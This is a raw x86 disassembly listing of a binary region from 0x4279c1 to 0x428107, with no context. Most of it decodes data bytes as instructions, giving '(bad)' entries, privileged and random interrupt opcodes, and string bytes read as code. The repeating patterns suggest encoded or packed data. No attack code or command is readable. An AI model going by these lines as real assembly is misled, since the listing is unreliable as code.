  4279c1:	adc    bh,bh
  4279c3:	out    0x37,al
  4279c5:	ficom  WORD PTR [ebx]
  4279c7:	in     al,dx
  4279c8:	iret   
  4279c9:	int    0x96
  4279cb:	mov    ch,cl
  4279cd:	(bad)  
  4279ce:	dec    esp
  4279cf:	int    0xe6
  4279d1:	mov    ch,cl
  4279d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279d4:	dec    esp
  4279d5:	cmp    edx,DWORD PTR [ecx]
  4279d7:	cmp    esp,ebx
  4279d9:	das    
  4279da:	inc    ebp
  4279db:	sti    
  4279dc:	xchg   edx,eax
  4279dd:	shr    ecx,cl
  4279df:	sub    BYTE PTR [edx],dl
  4279e1:	clc    
  4279e2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279e9:	cmp    ebx,ebp
  4279eb:	push   ebx
  4279ec:	clc    
  4279ed:	int    0xe6
  4279ef:	mov    BYTE PTR [ebx-0x2b],dl
  4279f2:	int    0xa6
  4279f4:	dec    esp
  4279f5:	xchg   ecx,ebx
  4279f7:	sbb    esi,esp
  4279f9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279ff:	int    0x96
  427a01:	mov    ch,cl
  427a03:	(bad)  
  427a04:	dec    esp
  427a05:	int    0xe6
  427a07:	mov    ch,cl
  427a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a0a:	dec    esp
  427a0b:	cmp    edx,DWORD PTR [ecx]
  427a0d:	cmp    esp,ebx
  427a0f:	das    
  427a10:	inc    ebp
  427a11:	sti    
  427a12:	xchg   edx,eax
  427a13:	shr    ecx,cl
  427a15:	sub    BYTE PTR [ebx],bh
  427a17:	fst    st(3)
  427a19:	out    dx,eax
  427a1a:	xchg   edx,eax
  427a1b:	adc    bh,al
  427a1d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a24:	clc    
  427a25:	ds xchg esi,eax
  427a27:	xor    BYTE PTR [esi],bl
  427a29:	(bad)  
  427a2a:	adc    al,0xcd
  427a2c:	xchg   esi,eax
  427a2d:	cmp    al,0xcd
  427a2f:	(bad)  
  427a30:	inc    esp
  427a31:	int    0x96
  427a33:	xor    ch,cl
  427a35:	(bad)  
  427a36:	adc    al,0xcd
  427a38:	xchg   esi,eax
  427a39:	xor    ch,cl
  427a3b:	(bad)  
  427a3c:	adc    al,0xcd
  427a3e:	out    0x30,al
  427a40:	int    0xa6
  427a42:	adc    al,0x3b
  427a44:	adc    DWORD PTR [ebx],edi
  427a46:	jecxz  0x427a77
  427a48:	inc    ebp
  427a49:	sti    
  427a4a:	xchg   edx,eax
  427a4b:	shr    ecx,cl
  427a4d:	sub    BYTE PTR [ebx],bh
  427a4f:	fst    QWORD PTR [edx]
  427a51:	clc    
  427a52:	add    BYTE PTR [eax-0x102c9380],0x92
  427a59:	push   ebx
  427a5a:	clc    
  427a5b:	int    0xe6
  427a5d:	cmp    al,0x53
  427a5f:	aad    0xcd
  427a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a62:	inc    esp
  427a63:	cmp    edi,edx
  427a65:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a6b:	lea    eax,[edi+ebp*1+0x45]
  427a6f:	loope  0x427a03
  427a71:	cmp    ecx,ebx
  427a73:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a79:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a7e:	lea    esi,[eax]
  427a80:	shr    esp,cl
  427a82:	xchg   edx,eax
  427a83:	push   ebx
  427a84:	popf   
  427a85:	xchg   ecx,ebx
  427a87:	int    0x96
  427a89:	adc    al,0x1b
  427a8b:	hlt    
  427a8c:	add    al,0xf2
  427a8e:	std    
  427a8f:	shr    edi,cl
  427a91:	sub    BYTE PTR [ebx],bh
  427a93:	ins    DWORD PTR es:[edi],dx
  427a94:	adc    al,BYTE PTR [edx]
  427a96:	aam    0x37
  427a98:	ficom  WORD PTR [ebx]
  427a9a:	adc    bh,bl
  427a9c:	mov    ebp,0xcd25230a
  427aa1:	out    0x3c,al
  427aa3:	int    0xa6
  427aa5:	inc    esp
  427aa6:	add    al,0xe9
  427aa8:	std    
  427aa9:	adc    bh,al
  427aab:	aam    0x37
  427aad:	ficom  WORD PTR [ebx]
  427aaf:	adc    dh,ah
  427ab1:	mov    ebp,0x8725230a
  427ab6:	lock int 0xe6
  427ab9:	and    al,0x1b
  427abb:	aad    0x53
  427abd:	rcl    BYTE PTR [esi-0x43],cl
  427ac0:	or     ah,BYTE PTR [ebx]
  427ac2:	and    eax,0x12025370
  427ac7:	not    esi
  427ac9:	aaa    
  427aca:	ficom  WORD PTR [ebx]
  427acc:	cwde   
  427acd:	add    dh,dl
  427acf:	xor    al,0x0
  427ad1:	(bad)  
  427ad2:	sub    al,0x9a
  427ad4:	add    dh,dl
  427ad6:	sbb    al,0x0
  427ad8:	(bad)  
  427ad9:	adc    al,0x0
  427adb:	(bad)  
  427adc:	xor    BYTE PTR [eax],al
  427ade:	(bad)  
  427adf:	dec    esp
  427ae0:	add    dh,dl
  427ae2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ae8:	or     cl,BYTE PTR [ebx-0x57557433]
  427aee:	arpl   bx,cx
  427af0:	sar    BYTE PTR [eax+eax*4],cl
  427af3:	int    0x96
  427af5:	mov    ch,cl
  427af7:	(bad)  
  427af8:	dec    esp
  427af9:	int    0xe6
  427afb:	mov    ch,cl
  427afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427afe:	dec    esp
  427aff:	cmp    esp,ebx
  427b01:	cmp    edx,DWORD PTR [ecx]
  427b03:	das    
  427b04:	inc    ebp
  427b05:	sti    
  427b06:	xchg   edx,eax
  427b07:	shr    ecx,cl
  427b09:	sub    BYTE PTR [edx],dl
  427b0b:	clc    
  427b0c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b13:	cmp    ebx,ebp
  427b15:	push   ebx
  427b16:	aad    0x53
  427b18:	clc    
  427b19:	int    0xe6
  427b1b:	xor    ch,cl
  427b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b1e:	adc    al,0x53
  427b20:	fst    DWORD PTR [ebx-0xc]
  427b23:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b29:	int    0x96
  427b2b:	cmp    al,0xcd
  427b2d:	(bad)  
  427b2e:	inc    esp
  427b2f:	int    0x96
  427b31:	xor    ch,cl
  427b33:	(bad)  
  427b34:	adc    al,0xcd
  427b36:	xchg   esi,eax
  427b37:	mov    ch,cl
  427b39:	(bad)  
  427b3a:	dec    esp
  427b3b:	int    0x96
  427b3d:	mov    ch,cl
  427b3f:	(bad)  
  427b40:	dec    esp
  427b41:	int    0xe6
  427b43:	mov    ch,cl
  427b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b46:	dec    esp
  427b47:	cmp    esp,ebx
  427b49:	cmp    edx,DWORD PTR [ecx]
  427b4b:	das    
  427b4c:	inc    ebp
  427b4d:	sti    
  427b4e:	xchg   edx,eax
  427b4f:	shr    ecx,cl
  427b51:	sub    BYTE PTR [edx],dl
  427b53:	clc    
  427b54:	add    BYTE PTR [eax-0x22c49380],0x53
  427b5b:	aad    0xd3
  427b5d:	out    dx,eax
  427b5e:	xchg   edx,eax
  427b5f:	push   ebx
  427b60:	clc    
  427b61:	int    0xe6
  427b63:	xor    ch,cl
  427b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b66:	adc    al,0x3b
  427b68:	cli    
  427b69:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b6f:	lea    edx,[edi+ebp*1]
  427b72:	inc    ebp
  427b73:	loope  0x427b07
  427b75:	cmp    ecx,ebx
  427b77:	push   ebx
  427b78:	cli    
  427b79:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b7f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b84:	push   ebx
  427b85:	popf   
  427b86:	int    0x76
  427b88:	cmp    al,0xcd
  427b8a:	lea    eax,[edi+eax*4-0x27]
  427b8e:	int    0xe6
  427b90:	cmp    al,0x1b
  427b92:	hlt    
  427b93:	int    0xa6
  427b95:	inc    esp
  427b96:	adc    al,BYTE PTR [edx]
  427b98:	mov    ebp,0x5625230a
  427b9d:	jnp    0x427bd6
  427b9f:	ficom  WORD PTR [ebx]
  427ba1:	das    
  427ba2:	inc    ebp
  427ba3:	jge    0x427b37
  427ba5:	shr    ecx,cl
  427ba7:	sub    bl,dl
  427ba9:	jmp    0x427b3d
  427bab:	cmp    ebx,ebp
  427bad:	adc    bh,al
  427baf:	add    BYTE PTR [eax-0xfac9380],0x53
  427bb6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bbc:	lea    ecx,[eax-0x32b36933]
  427bc2:	out    0x30,al
  427bc4:	int    0xa6
  427bc6:	adc    al,0x4
  427bc8:	repnz std 
  427bca:	add    al,0xe9
  427bcc:	std    
  427bcd:	adc    al,BYTE PTR [edx]
  427bcf:	aam    0x37
  427bd1:	ficom  WORD PTR [ebx]
  427bd3:	adc    bh,al
  427bd5:	aam    0x37
  427bd7:	ficom  WORD PTR [ebx]
  427bd9:	shr    edi,cl
  427bdb:	sub    BYTE PTR [ebx],bh
  427bdd:	ins    DWORD PTR es:[edi],dx
  427bde:	adc    bh,bl
  427be0:	mov    ebp,0x1225230a
  427be5:	hlt    
  427be6:	mov    ebp,0x8725230a
  427beb:	lock sbb edx,ebp
  427bee:	jmp    0x427c37
  427bf0:	inc    DWORD PTR [eax]
  427bf2:	add    BYTE PTR [esi-0x12fb1233],dl
  427bf8:	sbb    al,0x98
  427bfa:	pop    edi
  427bfb:	(bad)  
  427bfc:	aaa    
  427bfd:	ficom  WORD PTR [ebx]
  427bff:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c05:	and    esp,DWORD PTR ds:0xc9f5760a
  427c0b:	jbe    0x427bca
  427c0d:	xchg   ecx,eax
  427c0e:	aaa    
  427c0f:	ficom  WORD PTR [ebx]
  427c11:	or     dh,BYTE PTR [esi-0x13]
  427c14:	int    0x96
  427c16:	adc    ebp,ecx
  427c18:	(bad)  
  427c19:	cmc    
  427c1a:	call   0xefd3:0x92fb452f
  427c21:	xchg   edx,eax
  427c22:	int    0xd6
  427c24:	adc    ebp,ecx
  427c26:	out    0xf5,al
  427c28:	jo     0x427c3c
  427c2a:	sti    
  427c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c2c:	mov    esi,0x3b4229
  427c31:	jno    0x427c86
  427c33:	(bad)  [edx]
  427c35:	xchg   esi,eax
  427c36:	std    
  427c37:	int    0x96
  427c39:	dec    esp
  427c3a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c40:	iret   
  427c41:	jbe    0x427c40
  427c43:	add    dh,dl
  427c45:	mov    bl,dl
  427c47:	mov    ecx,0xd6007028
  427c4c:	dec    esp
  427c4d:	add    dh,dl
  427c4f:	in     eax,dx
  427c50:	add    dh,dl
  427c52:	mov    ebp,0xf5d600
  427c57:	(bad)  
  427c58:	adc    DWORD PTR [ebp+0xfde6],edi
  427c5e:	stos   BYTE PTR es:[edi],al
  427c5f:	or     dh,BYTE PTR [esi-0x3]
  427c62:	int    0x76
  427c64:	std    
  427c65:	test   al,0xcb
  427c67:	ror    BYTE PTR [eax-0x12326980],cl
  427c6d:	add    al,0xb5
  427c6f:	stc    
  427c70:	add    al,0xed
  427c72:	inc    esp
  427c73:	cwde   
  427c74:	leave  
  427c75:	je     0x427cab
  427c77:	xor    al,0x80
  427c79:	add    BYTE PTR [eax+0x3474c980],0x44
  427c80:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c87:	xor    BYTE PTR [eax+0x0],dh
  427c8a:	(bad)  
  427c8b:	xor    al,0x0
  427c8d:	(bad)  
  427c8e:	sub    al,0x0
  427c90:	(bad)  
  427c91:	and    al,0x0
  427c93:	(bad)  
  427c94:	sbb    al,0x0
  427c96:	(bad)  
  427c97:	adc    al,0x0
  427c99:	(bad)  
  427c9a:	xor    BYTE PTR [eax],al
  427c9c:	(bad)  
  427c9d:	dec    esp
  427c9e:	add    dh,dl
  427ca0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427ca6:	int    0x76
  427ca8:	mov    BYTE PTR [edx],cl
  427caa:	je     0x427ce0
  427cac:	test   ch,cl
  427cae:	je     0x427ce4
  427cb0:	xor    al,0x6
  427cb2:	ins    DWORD PTR es:[edi],dx
  427cb3:	das    
  427cb4:	add    eax,0x80808017
  427cb9:	int    0x74
  427cbb:	xor    al,0x44
  427cbd:	push   es
  427cbe:	ins    DWORD PTR es:[edi],dx
  427cbf:	das    
  427cc0:	add    eax,0x8080800a
  427cc5:	add    ah,dl
  427cc7:	xor    al,0x24
  427cc9:	add    ah,dl
  427ccb:	xor    al,0x24
  427ccd:	add    ah,dl
  427ccf:	xor    al,0x24
  427cd1:	int    0x74
  427cd3:	xor    al,0x50
  427cd5:	add    cl,dh
  427cd7:	int    0x74
  427cd9:	xor    al,0x84
  427cdb:	int    0x74
  427cdd:	xor    al,0x84
  427cdf:	int    0x74
  427ce1:	xor    al,0x84
  427ce3:	iret   
  427ce4:	jbe    0x427c6a
  427ce6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cea:	int    0x74
  427cec:	xor    al,0x3c
  427cee:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427cf2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427cf6:	int    0x74
  427cf8:	xor    al,0x84
  427cfa:	int    0x74
  427cfc:	xor    al,0x84
  427cfe:	int    0x8c
  427d00:	xor    al,0x84
  427d02:	int    0xa
  427d04:	and    eax,0xcd808081
  427d09:	xor    ebp,ecx
  427d0b:	aam    0x34
  427d0d:	mov    ch,cl
  427d0f:	add    DWORD PTR ds:0x5e808081,ebp
  427d15:	sbb    BYTE PTR [edi],ch
  427d17:	or     edx,DWORD PTR ds:0xcd808081
  427d1d:	xor    ch,cl
  427d1f:	push   eax
  427d20:	int    0x62
  427d22:	fs iret 
  427d24:	xchg   esp,eax
  427d25:	sbb    BYTE PTR [eax-0x33],dh
  427d28:	push   ecx
  427d29:	int    0x22
  427d2b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d31:	pop    esi
  427d32:	sbb    BYTE PTR [edi],ch
  427d34:	add    al,0x7b
  427d36:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d40:	dec    edx
  427d41:	int    0x80
  427d43:	xor    ecx,DWORD PTR [edi]
  427d45:	xchg   ebx,edx
  427d47:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d4d:	or     ch,0x74
  427d50:	xor    al,0x44
  427d52:	push   es
  427d53:	ins    DWORD PTR es:[edi],dx
  427d54:	das    
  427d55:	push   es
  427d56:	cwde   
  427d57:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d61:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d6b:	je     0x427da1
  427d6d:	test   ch,cl
  427d6f:	add    DWORD PTR ds:0xcd808081,esp
  427d75:	or     BYTE PTR [edx],0x74
  427d78:	xor    al,0x4c
  427d7a:	int    0x74
  427d7c:	xor    al,0x84
  427d7e:	int    0x1
  427d80:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d86:	int    0x80
  427d88:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d8c:	int    0x74
  427d8e:	xor    al,0x84
  427d90:	int    0x1
  427d92:	int3   
  427d93:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d9d:	dec    esp
  427d9e:	int    0x74
  427da0:	xor    al,0x84
  427da2:	int    0x8c
  427da4:	xor    al,0x84
  427da6:	int    0x1
  427da8:	popf   
  427da9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427db3:	or     ch,0x89
  427db6:	imul   edx,ecx,0x3b358621
  427dbc:	jns    0x427dc2
  427dbe:	add    bh,bh
  427dc0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427dc6:	push   ebx
  427dc7:	jge    0x427dd3
  427dc9:	mov    WORD PTR [esp+ecx*2],?
  427dcc:	leave  
  427dcd:	je     0x427e03
  427dcf:	mov    BYTE PTR [eax-0x327f7f80],al
  427dd5:	je     0x427e0b
  427dd7:	xor    al,0x6
  427dd9:	ins    DWORD PTR es:[edi],dx
  427dda:	aam    0x73
  427ddc:	int    0x74
  427dde:	xor    al,0x30
  427de0:	add    al,0xbd
  427de2:	adc    ah,0x52
  427de5:	jl     0x427dbb
  427de7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427deb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427def:	add    ah,dl
  427df1:	xor    al,0x2c
  427df3:	add    ah,dl
  427df5:	xor    al,0x2c
  427df7:	add    ah,dl
  427df9:	xor    al,0x2c
  427dfb:	add    ah,dl
  427dfd:	xor    al,0x2c
  427dff:	int    0x74
  427e01:	xor    al,0x54
  427e03:	add    cl,dh
  427e05:	in     al,dx
  427e06:	cmp    BYTE PTR [eax],al
  427e08:	aam    0x34
  427e0a:	and    al,0x0
  427e0c:	aam    0x34
  427e0e:	and    al,0x0
  427e10:	aam    0x34
  427e12:	and    al,0xcd
  427e14:	je     0x427e4a
  427e16:	push   eax
  427e17:	add    cl,dh
  427e19:	in     al,dx
  427e1a:	and    al,BYTE PTR [eax]
  427e1c:	aam    0x34
  427e1e:	adc    al,0xcd
  427e20:	je     0x427e56
  427e22:	cmp    al,0x0
  427e24:	icebp  
  427e25:	in     al,dx
  427e26:	xchg   ch,cl
  427e28:	je     0x427e5e
  427e2a:	xor    al,0x0
  427e2c:	icebp  
  427e2d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e31:	int    0x74
  427e33:	xor    al,0x4c
  427e35:	push   es
  427e36:	ins    DWORD PTR es:[edi],dx
  427e37:	aam    0x4e
  427e39:	int    0x74
  427e3b:	xor    al,0x84
  427e3d:	leave  
  427e3e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e44:	and    DWORD PTR [esi+0x3474cd35],eax
  427e4a:	mov    ch,cl
  427e4c:	mov    WORD PTR [esp+eax*4],?
  427e4f:	int    0xa
  427e51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e52:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e5c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e62:	mov    ch,cl
  427e64:	mov    WORD PTR [eax+ecx*4],?
  427e67:	cmp    edi,DWORD PTR [ecx+0x4]
  427e6a:	add    bh,bh
  427e6c:	shl    edx,cl
  427e6e:	sub    bl,dl
  427e70:	mov    ebp,0xcdd35392
  427e75:	mov    WORD PTR [esp+ecx*2],?
  427e78:	inc    ebx
  427e79:	rcl    esi,cl
  427e7b:	and    ecx,ebp
  427e7d:	je     0x427eb3
  427e7f:	test   ch,cl
  427e81:	mov    WORD PTR [esp+eax*4],?
  427e84:	int    0xa
  427e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e87:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e91:	add    BYTE PTR [eax],0x70
  427e94:	cmp    al,0xec
  427e96:	push   ds
  427e97:	iret   
  427e98:	jbe    0x427e1e
  427e9a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e9e:	int    0x74
  427ea0:	xor    al,0x4c
  427ea2:	int    0x8c
  427ea4:	xor    al,0x84
  427ea6:	int    0xa
  427ea8:	in     al,0x81
  427eaa:	add    BYTE PTR [eax-0x777e7633],0xcd
  427eb1:	je     0x427ee7
  427eb3:	test   ch,cl
  427eb5:	add    ebp,ebp
  427eb7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427ec1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427ec7:	or     bh,0x84
  427eca:	adc    cl,ch
  427ecc:	mov    WORD PTR [esp+eax*4],?
  427ecf:	int    0xa
  427ed1:	in     al,0x81
  427ed3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eda:	mov    BYTE PTR [eax-0x2d591833],ch
  427ee0:	sub    al,0x80
  427ee2:	lds    edx,FWORD PTR [eax+0x75]
  427ee5:	ins    BYTE PTR es:[edi],dx
  427ee6:	jae    0x427f5f
  427ee8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427eec:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ef0:	add    BYTE PTR [ecx+0x74],ah
  427ef3:	ins    BYTE PTR es:[edi],dx
  427ef4:	popa   
  427ef5:	inc    esp
  427ef6:	gs popa 
  427ef8:	fs push 0x6561686d
  427efe:	add    BYTE PTR fs:[ebp+0x74],ah
  427f02:	push   0x65726143
  427f07:	outs   dx,DWORD PTR ds:[esi]
  427f08:	jns    0x427f70
  427f0a:	add    BYTE PTR gs:[edi+0x72],dh
  427f0e:	jns    0x427f7d
  427f10:	popa   
  427f11:	outs   dx,DWORD PTR ds:[esi]
  427f12:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f16:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f1a:	push   0x6f6d6568
  427f1f:	add    BYTE PTR fs:[edx+0x65],dl
  427f23:	arpl   WORD PTR [ebx+0x62],si
  427f26:	popa   
  427f27:	ins    BYTE PTR es:[edi],dx
  427f28:	jne    0x427fa2
  427f2a:	gs jae 0x427f2d
  427f2d:	ins    DWORD PTR es:[edi],dx
  427f2e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f35:	outs   dx,DWORD PTR ds:[esi]
  427f36:	jb     0x427fa7
  427f38:	jo     0x427f3a
  427f3a:	ja     0x427f9d
  427f3c:	gs je  0x427fae
  427f3f:	jb     0x427fb0
  427f41:	bound  esp,QWORD PTR [ecx+0x70]
  427f44:	add    BYTE PTR [ebx+0x69],cl
  427f47:	outs   dx,BYTE PTR ds:[esi]
  427f48:	addr16 addr16 popa 
  427f4b:	outs   dx,BYTE PTR ds:[esi]
  427f4c:	arpl   WORD PTR [ecx+0x70],sp
  427f4f:	add    BYTE PTR [edi+0x6e],al
  427f52:	jne    0x427fc7
  427f54:	je     0x427fbb
  427f56:	outs   dx,BYTE PTR ds:[esi]
  427f57:	push   esi
  427f58:	popa   
  427f59:	jb     0x427fd4
  427f5b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f5f:	jb     0x427fb1
  427f61:	popa   
  427f62:	ins    BYTE PTR es:[edi],dx
  427f63:	ins    DWORD PTR es:[edi],dx
  427f64:	je     0x427fcf
  427f66:	outs   dx,DWORD PTR ds:[esi]
  427f67:	ja     0x427fce
  427f69:	jb     0x427f6b
  427f6b:	jo     0x427fd2
  427f6d:	ins    DWORD PTR es:[edi],dx
  427f6e:	jns    0x427fe4
  427f70:	push   0x6f656562
  427f75:	outs   dx,BYTE PTR ds:[esi]
  427f76:	push   eax
  427f77:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f7e:	inc    ebx
  427f7f:	outs   dx,DWORD PTR ds:[esi]
  427f80:	popa   
  427f81:	ins    BYTE PTR es:[edi],dx
  427f82:	popa   
  427f83:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f8a:	je     0x428005
  427f8c:	outs   dx,DWORD PTR gs:[esi]
  427f8e:	outs   dx,BYTE PTR ds:[esi]
  427f8f:	gs ins BYTE PTR es:[edi],dx
  427f91:	inc    ebx
  427f92:	push   0x54007261
  427f97:	jns    0x428009
  427f99:	jns    0x428008
  427f9b:	jne    0x428002
  427f9d:	imul   eax,DWORD PTR gs:[eax],0x70
  427fa1:	outs   dx,DWORD PTR ds:[esi]
  427fa2:	je     0x427fe6
  427fa4:	gs gs jb 0x428018
  427fa8:	outs   dx,DWORD PTR ds:[esi]
  427fa9:	je     0x428016
  427fab:	imul   eax,DWORD PTR [eax],0x616c7548
  427fb1:	jo     0x42801c
  427fb3:	popa   
  427fb4:	ins    BYTE PTR es:[edi],dx
  427fb5:	dec    ebx
  427fb6:	outs   dx,BYTE PTR ds:[esi]
  427fb7:	popa   
  427fb8:	jo     0x428033
  427fba:	add    BYTE PTR gs:[eax+0x6f],dh
  427fbe:	je     0x428002
  427fc0:	gs ins BYTE PTR es:[edi],dx
  427fc2:	jae    0x428033
  427fc4:	js     0x427fc6
  427fc6:	popa   
  427fc7:	data16 je 0x428010
  427fca:	ins    BYTE PTR es:[edi],dx
  427fcb:	popa   
  427fcc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fd0:	gs jae 0x428034
  427fd3:	jb     0x427fd5
  427fd5:	inc    edx
  427fd6:	ins    BYTE PTR es:[edi],dx
  427fd7:	popa   
  427fd8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fdc:	je     0x428044
  427fde:	ins    BYTE PTR es:[edi],dx
  427fdf:	jns    0x428056
  427fe1:	push   0x6d6d6800
  427fe6:	popa   
  427fe7:	inc    edi
  427fe8:	popa   
  427fe9:	ins    BYTE PTR es:[edi],dx
  427fea:	ins    BYTE PTR es:[edi],dx
  427feb:	push   0x48007361
  427ff0:	outs   dx,DWORD PTR ds:[esi]
  427ff1:	ins    DWORD PTR es:[edi],dx
  427ff2:	outs   dx,DWORD PTR gs:[esi]
  427ff4:	jb     0x42805b
  427ff6:	data16 jno 0x428062
  427ff9:	jae    0x42805c
  427ffb:	bound  esi,QWORD PTR [eax+0x61]
  427ffe:	add    BYTE PTR [ebp+0x74],ah
  428001:	outs   dx,BYTE PTR ds:[esi]
  428002:	gs addr16 jbe 0x428067
  428006:	je     0x428081
  428008:	gs popa 
  42800a:	add    BYTE PTR [ebp+0x67],ah
  42800d:	outs   dx,DWORD PTR ds:[esi]
  42800e:	inc    edi
  42800f:	popa   
  428010:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428018:	jo     0x42807f
  42801a:	fs jbe 0x42807e
  42801d:	je     0x428094
  42801f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428023:	outs   dx,DWORD PTR ds:[esi]
  428024:	add    BYTE PTR [edx+0x0],ch
  428027:	jne    0x428029
  428029:	add    BYTE PTR [bp+0x0],ch
  42802d:	popa   
  42802e:	add    BYTE PTR [esi+0x0],ch
  428031:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428036:	add    BYTE PTR [ebp+0x0],dh
  428039:	ins    DWORD PTR es:[edi],dx
  42803a:	add    BYTE PTR [eax],al
  42803c:	add    BYTE PTR [edi+0x0],ch
  42803f:	jb     0x428041
  428041:	ja     0x428043
  428043:	imul   eax,DWORD PTR [eax],0x680073
  428049:	outs   dx,BYTE PTR ds:[esi]
  42804a:	add    BYTE PTR [ecx+0x0],ch
  42804d:	add    BYTE PTR fs:[ecx+0x0],ch
  428051:	ja     0x428053
  428053:	imul   eax,DWORD PTR [eax],0x65006e
  428059:	push   0x70000000
  42805e:	add    BYTE PTR [ecx+0x0],ah
  428061:	je     0x428063
  428063:	jbe    0x428065
  428065:	add    BYTE PTR gs:[ebp+0x0],ah
  428069:	je     0x42806b
  42806b:	add    BYTE PTR gs:[edi+0x0],ah
  42806f:	ins    BYTE PTR es:[edi],dx
  428070:	add    BYTE PTR [ecx+0x0],ah
  428073:	imul   eax,DWORD PTR [eax],0x66
  428079:	outs   dx,DWORD PTR ds:[esi]
  42807a:	add    BYTE PTR [esi+0x0],ch
  42807d:	je     0x42807f
  42807f:	popa   
  428080:	add    BYTE PTR [edi+0x0],dh
  428083:	push   ebx
  428084:	add    BYTE PTR [edi+0x0],ch
  428087:	arpl   WORD PTR [eax],ax
  428089:	imul   eax,DWORD PTR [eax],0x61
  42808c:	add    BYTE PTR [esi+0x0],dh
  42808f:	outs   dx,DWORD PTR ds:[esi]
  428090:	add    BYTE PTR [eax],al
  428092:	add    BYTE PTR [ebp+0x0],ch
  428095:	jns    0x428097
  428097:	add    BYTE PTR gs:[esi+0x0],ah
  42809b:	ins    BYTE PTR es:[edi],dx
  42809c:	add    BYTE PTR [ecx+0x0],ah
  42809f:	jns    0x4280a1
  4280a1:	jbe    0x4280a3
  4280a3:	popa   
  4280a4:	add    BYTE PTR [esi+0x0],ch
  4280a7:	popa   
  4280a8:	add    BYTE PTR [edi+0x0],ah
  4280ab:	outs   dx,DWORD PTR ds:[esi]
  4280ac:	add    BYTE PTR [eax],al
  4280ae:	add    BYTE PTR [edi+0x0],ch
  4280b1:	jb     0x4280b3
  4280b3:	jae    0x4280b5
  4280b5:	imul   eax,DWORD PTR [eax],0x47006e
  4280bb:	imul   eax,DWORD PTR [eax],0x70006d
  4280c1:	bound  eax,QWORD PTR [eax]
  4280c3:	outs   dx,DWORD PTR ds:[esi]
  4280c4:	add    BYTE PTR [eax+0x0],dh
  4280c7:	imul   eax,DWORD PTR [eax],0x650000
  4280cd:	js     0x4280cf
  4280cf:	jae    0x4280d1
  4280d1:	outs   dx,DWORD PTR ds:[esi]
  4280d2:	add    BYTE PTR [ebx+0x0],dh
  4280d5:	popa   
  4280d6:	add    BYTE PTR [esi+0x0],ch
  4280d9:	je     0x4280db
  4280db:	add    BYTE PTR [eax],al
  4280dd:	bound  eax,QWORD PTR [eax]
  4280df:	jns    0x4280e1
  4280e1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280e6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280ea:	add    BYTE PTR [ecx+0x0],ah
  4280ed:	add    BYTE PTR [eax],al
  4280ef:	js     0x4280f1
  4280f1:	imul   eax,DWORD PTR [eax],0x610054
  4280f7:	imul   eax,DWORD PTR [eax],0x48006e
  4280fd:	popa   
  4280fe:	add    BYTE PTR [esi+0x0],ch
  428101:	add    BYTE PTR fs:[eax],al
  428104:	add    BYTE PTR [edi+0x0],cl
  428107:	ja     0x428109
